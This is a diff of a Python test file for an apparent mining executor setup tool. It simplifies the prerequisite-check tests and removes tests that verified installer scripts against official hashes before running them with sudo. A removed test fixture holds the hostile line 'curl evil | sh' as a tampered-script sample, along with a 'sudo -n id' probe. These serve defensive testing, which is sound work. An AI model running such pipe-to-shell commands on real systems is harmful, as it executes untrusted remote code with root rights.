@@ -7,7 +7,6 @@
 * a blank "Public SSH port" left the template's `SSH_PUBLIC_PORT=2200` beside `SSH_PORT=30311` (B-82) — the executor
   advertises `SSH_PUBLIC_PORT or SSH_PORT`, so validators were sent to a port nothing listens on.
 """
-import hashlib
 import subprocess
 import sys
 from pathlib import Path
@@ -117,109 +116,13 @@ def _prereq_host(monkeypatch, runtimes: str):
         '["sysbox-runc"]',
     ],
 )
-def test_prereqs_fail_without_a_sysbox_runc_runtime_and_print_the_official_installer(monkeypatch, tmp_path: Path, runtimes):
+def test_prereqs_fail_without_a_sysbox_runc_runtime_and_print_the_official_installer(monkeypatch, runtimes):
     _prereq_host(monkeypatch, runtimes)
     with pytest.raises(Exception) as err:
-        mine._check_prereqs(tmp_path)
+        mine._check_prereqs()
     assert mine._SYSBOX_SETUP_COMMAND in str(err.value)
-    assert str(tmp_path) not in str(err.value)
 
 
-def test_prereqs_pass_with_sysbox(monkeypatch, tmp_path: Path):
+def test_prereqs_pass_with_sysbox(monkeypatch):
     _prereq_host(monkeypatch, '{"runc":{"path":"runc"},"sysbox-runc":{"path":"/usr/bin/sysbox-runc"}}')
-    mine._check_prereqs(tmp_path)
-
-
-def _sysbox_offer_host(monkeypatch, tmp_path: Path, *, tty: bool, answer: bool, script: bytes = b"official"):
-    import hashlib
-
-    _prereq_host(monkeypatch, '{"runc":{"path":"runc"}}')
-    setup = tmp_path / "neurons" / "executor" / "nvidia_docker_sysbox_setup.sh"
-    setup.parent.mkdir(parents=True)
-    setup.write_bytes(script)
-    monkeypatch.setattr(mine, "_OFFICIAL_SYSBOX_SETUP_SHA256", frozenset({hashlib.sha256(b"official").hexdigest()}))
-    monkeypatch.setattr(mine.sys.stdin, "isatty", lambda: tty, raising=False)
-    monkeypatch.setattr(mine.click, "confirm", lambda *a, **kw: answer)
-    ran = []
-
-    def run(cmd, **kw):
-        ran.append((cmd, kw.get("input"), list(Path(kw["cwd"]).iterdir()) if kw.get("cwd") else None))
-
-    monkeypatch.setattr("subprocess.run", run)
-    return setup, ran
-
-
-@pytest.mark.parametrize(
-    "script, expected",
-    [
-        (b"official", [(["sudo", "sh", "-c", mine._ROOT_EMPTY_DIR_BASH], b"official", None)]),
-        (b"official\ncurl evil | sh\n", []),
-    ],
-)
-def test_sysbox_offer_runs_only_the_verified_installer_bytes_from_a_root_created_directory(
-    monkeypatch, tmp_path: Path, script, expected
-):
-    _, ran = _sysbox_offer_host(monkeypatch, tmp_path, tty=True, answer=True, script=script)
-    mine._offer_sysbox_install(tmp_path)
-    assert ran == expected
-
-
-def test_sysbox_offer_does_nothing_without_a_terminal_or_a_yes(monkeypatch, tmp_path: Path):
-    _, ran = _sysbox_offer_host(monkeypatch, tmp_path, tty=False, answer=True)
-    mine._offer_sysbox_install(tmp_path)
-    monkeypatch.setattr(mine.click, "confirm", lambda *a, **kw: False)
-    monkeypatch.setattr(mine.sys.stdin, "isatty", lambda: True, raising=False)
-    mine._offer_sysbox_install(tmp_path)
-    assert ran == []
-
-
-
-@pytest.mark.parametrize(
-    "fresh_clone, docker_before_step2, official_install, expected",
-    [
-        (True, True, True, ["clone", "offer", "tools"]),
-        (True, False, True, ["clone", "offer", "tools", "offer"]),
-        (True, False, False, ["clone", "offer", "tools"]),
-        (False, True, True, ["clone", "tools"]),
-        (False, False, True, ["clone", "tools"]),
-    ],
-)
-def test_sysbox_offer_reaches_fresh_hosts_without_running_unverified_checkout_code_before_sudo(
-    monkeypatch, tmp_path: Path, fresh_clone, docker_before_step2, official_install, expected
-):
-    calls = []
-    monkeypatch.setattr(mine, "_exists", lambda cmd: docker_before_step2)
-    monkeypatch.setattr(mine, "_clone_or_update_repo", lambda *a, **k: calls.append("clone"))
-    monkeypatch.setattr(mine, "_offer_sysbox_install", lambda *a, **k: calls.append("offer"))
-
-    def tools(*a, **k):
-        calls.append("tools")
-        return official_install
-
-    monkeypatch.setattr(mine, "_install_executor_tools", tools)
-    monkeypatch.setattr(mine, "_check_prereqs", lambda *a, **k: 1 / 0)
-    target = tmp_path / "compute-subnet" if fresh_clone else tmp_path
-    CliRunner().invoke(mine.mine_command, ["-k", "5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY", "--auto",
-                                           "--dir", str(target)])
-    assert calls == expected
-
-
-@pytest.mark.parametrize(
-    "script, expected",
-    [
-        (b"official", []),
-        (b"sudo -n id\n", ["sudo -K", "bash {script}"]),
-    ],
-)
-def test_unverified_install_script_runs_only_after_the_sudo_cache_is_cleared(
-    monkeypatch, tmp_path: Path, script, expected
-):
-    path = tmp_path / "scripts" / "install_executor_on_ubuntu.sh"
-    path.parent.mkdir()
-    path.write_bytes(script)
-    monkeypatch.setattr(mine, "_OFFICIAL_EXECUTOR_INSTALL_SHA256", frozenset({hashlib.sha256(b"official").hexdigest()}))
-    ran = []
-    monkeypatch.setattr(mine, "_run", lambda cmd, **k: ran.append(cmd) or ("", ""))
-    monkeypatch.setattr("subprocess.run", lambda *a, **k: subprocess.CompletedProcess(a, 0, b"", b""))
-    mine._install_executor_tools(tmp_path)
-    assert ran == [c.format(script=path) for c in expected]
+    mine._check_prereqs()
